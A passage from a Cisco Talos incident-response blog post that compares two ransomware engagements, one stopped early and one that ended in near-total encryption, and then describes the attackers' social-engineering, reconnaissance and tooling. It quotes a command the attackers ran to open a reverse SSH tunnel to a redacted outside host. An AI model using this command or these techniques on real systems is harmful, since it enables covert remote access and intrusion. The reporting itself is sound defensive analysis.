---
title: Talos IR ransomware engagements and the significance of timeliness in incident response
url: https://blog.talosintelligence.com/talos-ir-ransomware-engagements-and-the-significance-of-timeliness-in-incident-response/
source: Over Security - Cybersecurity news aggregator
date: 2025-07-17
fetch_date: 2025-10-06T23:54:47.334558
---

# Talos IR ransomware engagements and the significance of timeliness in incident response

# Cisco Talos Blog

[ ]

* [Intelligence Center](https://talosintelligence.com/reputation)

  [ ]

  + [# Intelligence Center](https://talosintelligence.com/reputation)
  + BACK
  + [Intelligence Search](https://talosintelligence.com/reputation_center)
  + [Email & Spam Trends](https://talosintelligence.com/reputation_center/email_rep)
* [Vulnerability Research](https://talosintelligence.com/vulnerability_info)

  [ ]

  + [# Vulnerability Research](https://talosintelligence.com/vulnerability_info)
  + BACK
  + [Vulnerability Reports](https://talosintelligence.com/vulnerability_reports)
  + [Microsoft Advisories](https://talosintelligence.com/ms_advisories)
* [Incident Response](https://talosintelligence.com/incident_response)

  [ ]

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](https://talosintelligence.com/incident_response/services#reactive-services)
  + [Proactive Services](https://talosintelligence.com/incident_response/services#proactive-services)
  + [Emergency Support](https://talosintelligence.com/incident_response/contact)
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  [ ]

  # Security Resources

  + BACK

  Security Resources
  + [Open Source Security Tools](https://talosintelligence.com/software)
  + [Intelligence Categories Reference](https://talosintelligence.com/categories)
  + [Secure Endpoint Naming Reference](https://talosintelligence.com/secure-endpoint-naming)
* Media

  [ ]

  # Media

  + BACK

  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](https://talosintelligence.com/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](https://talosintelligence.com/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  [ ]

  # Company

  + BACK

  Company
  + [About Talos](https://talosintelligence.com/about)
  + [Careers](https://talosintelligence.com/careers)

![](/content/images/2025/07/Timeliness.jpg)

# Talos IR ransomware engagements and the significance of timeliness in incident response

By
[Aliza Johnson](https://blog.talosintelligence.com/author/aliza/),
[James Nutland](https://blog.talosintelligence.com/author/james/)

Wednesday, July 16, 2025 06:00

[Cisco Talos Incident Response](/category/cisco-talos-incident-response/)
[ransomware](/category/ransomware/)

* Cisco Talos routinely responds to ransomware engagements where the impact could have been mitigated or wholly prevented if the victim organization had initiated remediation efforts earlier in the attack lifecycle. The significance of early intervention in ransomware attacks is particularly exemplified by two recent Cisco Talos Incident Response (Talos IR) ransomware engagements.
* In one incident, the victim engaged Talos IR immediately after discovering malicious activity alerts. Talos IR worked swiftly to combat additional malicious activity and prevented the execution of any encryption in the environment.
* Conversely, in a second incident, the victim ignored alerts of malicious activity and did not contact Talos IR until after the ransomware binary began to execute. Talos IR was then not provided network access for analysis for over a day, during which time the actors achieved nearly 100% host encryption.
* While there are many factors that can impact the success and severity of a ransomware attack, such as an actor’s sophistication and advanced tooling, close similarities between these two ransomware engagements led us to negate that these variables significantly influenced the disparate outcomes between these two attacks.

---

## Introduction

As ransomware threat actors continuously decrease their dwell time — here defined as the duration between initial access and encryption — it is increasingly imperative to be mindful of timeliness in incident response engagements ([Infosecurity Magazine](https://www.infosecurity-magazine.com/news/breakout-time-accelerates-22/%22%20/l%20%22%3A~%3Atext%3DThe%20quickest%20breakout%20time%20recorded%2Cnetwork%20in%20under%2030%20minutes.%E2%80%9D%26text%3DThe%20firm%20has%20three%20theories%2Cstealing%20data%20with%20minimal%20delay.%E2%80%9D), [CyberScoop](https://cyberscoop.com/cybercriminals-record-speed-attacks-2024/#:~:text=The%20technical%20expertise%20of%20ransomware,only%2020%25%20included%20encryption.%E2%80%9D), [Orca](https://orca.security/resources/blog/ransomware-attacks-encrypt-networks-faster/#:~:text=Ransomware%20attackers%20are%20accelerating%20faster,to%20four%20days%20on%20average.), [ThreatDown](https://www.threatdown.com/blog/from-weeks-to-hours-why-ransomware-attacks-are-getting-quicker/)). Early intervention and remediation can significantly mitigate or even wholly prevent repercussions of ransomware attacks, such as financial loss, reputational damage and legal repercussions, as exemplified by a comparison of two recent Talos IR engagements.

In both these cases, the threat actors leveraged similar tools and tactics, techniques and procedures (TTPs) and the victim was alerted to suspicious activity prior to ransomware execution, yet one engagement resulted in 0% network encryption while the other victim experienced nearly 100% encryption.

Talos assesses that encryption occurred due to several time delays at pivotal moments. First, Talos was not employed to start an IR engagement until after the ransomware binary was executed, despite early warnings, which allowed the actor to initiate encryption. Then, Talos was provided network access over 30 hours after the engagement began, during which time the actors obtained widespread encryption. For context, according to Talos data, many ransomware variants can seize complete control of a network in just 24-48 hours after initial access. Furthermore, these delays also allowed the threat actor to employ defensive measures that severely limited Talos’ ability to retroactively analyze system logs, a crucial step toward remediating the threat and hardening the network.

## Description of attack lifecycles

### Engagement 1: Data theft without encryption

In late April, Chaos ransomware affiliates gained an initial foothold into a victim environment via social engineering. They sent a flood of spam emails to a single user, then contacted the user in Microsoft Teams masquerading as IT support. During the Microsoft Teams session, the adversary guided the user to launch Microsoft Quick Assist and enter their credentials into an unknown login page, which ultimately provided access to the account. That same day, the victim was alerted to the security breach and engaged Talos IR to mitigate the threat, allowing Talos IR to review activity logs before the adversary could completely delete or modify them.

The affiliates relied heavily on living-off-the-land binaries (LoLBins) and dual-use tools to conduct post-compromise activity and leveraged Impacket’s “atexec.py” module to execute commands remotely, specifically leveraging the Task Scheduler service. They began exploring the victim’s environment using Windows command line utilities like “ipconfig /all” to list network connections, “nltest /dclist” to list the domain controllers (DCs) within Active Directory (AD) and “quser.exe” to query information about user sessions. We also observed multiple outbound connections to adversary-controlled IP addresses using OpenSSH, an open-source suite of secure networking utilities that provide encrypted communication channels to create a reverse proxy SSH connection.

```
C:\Windows\System32\OpenSSH\ssh.exe -R :12840 -N REDACTED-p 443 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
```

To move laterally within the environment, the adversary used Microsoft Remote Desktop and Advanced IP Scanner to obtain access to new accounts an...